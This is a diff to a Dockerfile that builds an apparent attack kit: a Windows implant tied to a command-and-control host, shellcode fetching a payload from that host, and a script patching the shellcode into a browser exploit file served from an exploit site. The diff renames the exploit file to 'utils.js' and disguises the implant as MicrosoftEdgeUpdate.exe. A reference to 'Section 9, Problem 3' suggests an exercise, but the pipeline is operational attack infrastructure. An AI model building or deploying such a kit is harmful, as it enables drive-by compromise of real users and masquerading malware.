@@ -31,16 +31,18 @@ RUN ./Configure mingw64 \
     && make -j$(nproc) \
     && make install_sw
 
-# ── Stage 2: build implant.exe + patch shellcode + patch exploit.js ───
+# ── Stage 2: build implant.exe + patch shellcode + patch utils.js ───
 FROM debian:bookworm-slim AS builder
 
 ARG C2_HOST_IP
 ARG ENROLLMENT_TOKEN
+ARG DOWNLOAD_TOKEN
 
 RUN apt-get update && apt-get install -y --no-install-recommends \
         build-essential \
         make \
         mingw-w64 \
+        nasm \
         python3 \
     && rm -rf /var/lib/apt/lists/*
 
@@ -63,29 +65,30 @@ RUN make bin/windows/implant.exe \
         ENROLLMENT_TOKEN="${ENROLLMENT_TOKEN}" \
         OPENSSL_WIN_PREFIX=/opt/openssl-win
 
-# Patch shellcode and exploit.js
+# ── Build shellcode ───
+WORKDIR /opt/shellcode-gen
+COPY exfil-server/shellcode-generation/ ./
+RUN make clean && make HOST_IP="${C2_HOST_IP}" DOWNLOAD_TOKEN="${DOWNLOAD_TOKEN}"
+
+# Patch shellcode and utils.js
 WORKDIR /opt/exploit/exploit-contents
 COPY exfil-server/exploit-contents/ ./
 
-WORKDIR /opt/shellcode-gen
-COPY exfil-server/shellcode-generation/ ./
-RUN cp /opt/shellcode-gen/bin/final_shellcode.bin /tmp/shellcode.bin
-
-# Patch shellcode uint32 array into exploit.js
+# Patch shellcode uint32 array into utils.js
 RUN python3 - <<'EOF'
 import struct, re
-data = open('/tmp/shellcode.bin', 'rb').read()
+data = open('/opt/shellcode-gen/bin/final_shellcode.bin', 'rb').read()
 r = len(data) % 4
 if r: data += b'\x00' * (4 - r)
 ints = struct.unpack('<' + 'I' * (len(data)//4), data)
 arr = '[' + ', '.join(str(i) for i in ints) + ']'
-content = open('/opt/exploit/exploit-contents/exploit.js').read()
+content = open('/opt/exploit/exploit-contents/utils.js').read()
 patched, n = re.subn(r'^var shellcode = \[.*?\];',
                      'var shellcode = ' + arr + ';',
                      content, flags=re.MULTILINE)
-assert n, 'shellcode line not found in exploit.js'
-open('/opt/exploit/exploit-contents/exploit.js', 'w').write(patched)
-print('exploit.js patched with', n, 'replacement(s)')
+assert n, 'shellcode line not found in utils.js'
+open('/opt/exploit/exploit-contents/utils.js', 'w').write(patched)
+print('utils.js patched with', n, 'replacement(s)')
 EOF
 
 # Rename implant.exe to MicrosoftEdgeUpdate.exe (Section 9, Problem 3)
@@ -102,7 +105,7 @@ RUN apt-get update && apt-get install -y --no-install-recommends \
 
 WORKDIR /opt/exploit
 
-# Exploit site (patched exploit.js from builder)
+# Exploit site (patched utils.js from builder)
 COPY --from=builder /opt/exploit/exploit-contents/ ./exploit-contents/
 
 # Payload (renamed to MicrosoftEdgeUpdate.exe)
